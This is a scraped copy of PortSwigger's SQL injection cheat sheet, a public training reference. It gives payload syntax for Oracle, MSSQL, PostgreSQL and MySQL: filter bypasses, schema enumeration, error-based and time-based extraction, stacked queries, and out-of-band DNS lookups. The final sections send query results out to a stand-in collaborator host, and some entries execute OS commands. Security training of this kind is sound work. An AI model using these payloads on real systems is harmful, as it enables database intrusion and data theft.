---
title: "SQL injection cheat sheet"
author: PortSwigger Web Security Academy
url: https://portswigger.net/web-security/sql-injection/cheat-sheet
date_scraped: 2026-11-19
platform: portswigger
disclosed_report: none
bounty: not stated
vuln_class: sqli
---

<!-- Raw scraped text below. Public reference. DBMS-specific syntax arsenal. -->

# SQL injection cheat sheet (DBMS-specific syntax)

## String concatenation
- Oracle: `'foo'||'bar'`
- Microsoft (MSSQL): `'foo'+'bar'`
- PostgreSQL: `'foo'||'bar'`
- MySQL: `'foo' 'bar'` (space between) or `CONCAT('foo','bar')`

## Substring (1-based offset; returns `ba`)
- Oracle: `SUBSTR('foobar',4,2)`
- MSSQL/PostgreSQL/MySQL: `SUBSTRING('foobar',4,2)`

## Comments
- Oracle: `--comment`
- MSSQL/PostgreSQL: `--comment`, `/*comment*/`
- MySQL: `#comment`, `-- comment` (space after `--`), `/*comment*/`

## Bypassing filters
- Case variation: `SeLeCT` (SQL keywords are case-insensitive).
- Inline comments for whitespace: `SELECT/**/username/**/FROM/**/users`.
- MySQL versioned comments execute the contents: `/*!SELECT*/` is run as `SELECT`.
- Encoding-based (URL-encode keywords, `CHAR()` to build strings) covered under "Obfuscating attacks using encodings".

## Database version
- Oracle: `SELECT banner FROM v$version`, `SELECT version FROM v$instance`
- MSSQL: `SELECT @@version`
- PostgreSQL: `SELECT version()`
- MySQL: `SELECT @@version`

## Database contents (tables/columns)
- Oracle: `SELECT * FROM all_tables`, `SELECT * FROM all_tab_columns WHERE table_name = 'X'`
- MSSQL/PostgreSQL/MySQL: `SELECT * FROM information_schema.tables`, `SELECT * FROM information_schema.columns WHERE table_name = 'X'`

## Conditional errors (error only if condition true)
- Oracle: `SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
- MSSQL: `SELECT CASE WHEN (COND) THEN 1/0 ELSE NULL END`
- PostgreSQL: `1 = (SELECT CASE WHEN (COND) THEN 1/(SELECT 0) ELSE NULL END)`
- MySQL: `SELECT IF(COND,(SELECT table_name FROM information_schema.tables),'a')`

## Extracting data via visible error messages
- MSSQL: `SELECT 'foo' WHERE 1 = (SELECT 'secret')` -> "Conversion failed when converting the varchar value 'secret' to data type int."
- PostgreSQL: `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` -> `invalid input syntax for integer: "secret"`
- MySQL: `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c,(SELECT 'secret')))` -> `XPATH syntax error: '\secret'`

## Batched (stacked) queries
- Oracle: not supported.
- MSSQL: `QUERY-1; QUERY-2` (also space-separated).
- PostgreSQL/MySQL: `QUERY-1; QUERY-2`. Note: MySQL batched queries usually cannot be used for SQLi, except via certain PHP/Python APIs. Results of subsequent queries are not returned, so stacked queries are mainly for blind (DNS/error/time).

## Unconditional time delay (10s)
- Oracle: `dbms_pipe.receive_message(('a'),10)`
- MSSQL: `WAITFOR DELAY '0:0:10'`
- PostgreSQL: `SELECT pg_sleep(10)`
- MySQL: `SELECT SLEEP(10)`

## Conditional time delay (delay if condition true)
- Oracle: `SELECT CASE WHEN (COND) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
- MSSQL: `IF (COND) WAITFOR DELAY '0:0:10'`
- PostgreSQL: `SELECT CASE WHEN (COND) THEN pg_sleep(10) ELSE pg_sleep(0) END`
- MySQL: `SELECT IF(COND,SLEEP(10),'a')`

## DNS lookup (OOB; use Burp Collaborator subdomain)
- Oracle (XXE, patched but many unpatched): `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLAB/"> %remote;]>'),'/l') FROM dual`; patched-but-privileged: `SELECT UTL_INADDR.get_host_address('BURP-COLLAB')`
- MSSQL: `exec master..xp_dirtree '//BURP-COLLAB/a'`
- PostgreSQL: `copy (SELECT '') to program 'nslookup BURP-COLLAB'`
- MySQL (Windows only): `LOAD_FILE('\\\\BURP-COLLAB\\a')`, `SELECT ... INTO OUTFILE '\\\\BURP-COLLAB\a'`

## DNS lookup WITH data exfiltration
- Oracle: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY)||'.BURP-COLLAB/"> %remote;]>'),'/l') FROM dual`
- MSSQL: `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY);exec('master..xp_dirtree "//'+@p+'.BURP-COLLAB/a"')`
- PostgreSQL: a `security definer` plpgsql function that `copy (SELECT '') to program 'nslookup '||p||'.BURP-COLLAB'`
- MySQL (Windows only): `SELECT YOUR-QUERY INTO OUTFILE '\\\\BURP-COLLAB\a'`
